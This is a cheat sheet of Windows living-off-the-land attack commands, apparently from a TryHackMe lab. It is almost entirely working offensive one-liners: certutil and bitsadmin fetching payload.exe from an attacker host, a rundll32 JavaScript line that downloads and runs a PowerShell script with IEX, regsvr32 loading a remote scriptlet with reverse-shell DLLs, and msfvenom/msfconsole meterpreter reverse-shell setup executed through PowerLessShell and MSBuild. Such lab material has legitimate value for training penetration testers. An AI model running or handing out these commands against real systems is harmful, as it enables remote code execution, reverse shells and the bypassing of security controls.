## Sysinternals
	\\live.sysinternals.com\tools

## File transfer
	certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
	
	bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
	
	findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe

## File Execution
#### File Explorer
	C:\Windows\explorer.exe /root,"C:\Windows\System32\calc.exe"
	C:\Windows\SysWOW64\explorer.exe /root,"C:\Windows\System32\calc.exe"

#### Wmic
	wmic.exe process call create [executable]

#### Rundll32
	## Run Calculator
	C:\Windows\System32\rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
	
	#Run powershell command
	C:\Windows\SysWOW64\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");

## Regsvr32

	c:\Windows\System32\regsvr32.exe [reverse shell].dll
	C:\Windows\SysWOW64\regsvr32.exe [reverse shell].dll

	OR

	c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct [reverse shell].dll
	C:\Windows\SysWOW64\regsvr32.exe /s /n /u /i:http://example.com/file.sct [reverse shell].dll

## PowerlessShell

```
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=10.8.79.239 LPORT=4444 -f psh-reflection > liv0ff.ps1

msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4444;exploit"

cd /opt/PowerLessShell
python2 PowerLessShell.py -type powershell -source liv0ff.ps1 -output liv0ff.csproj

c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```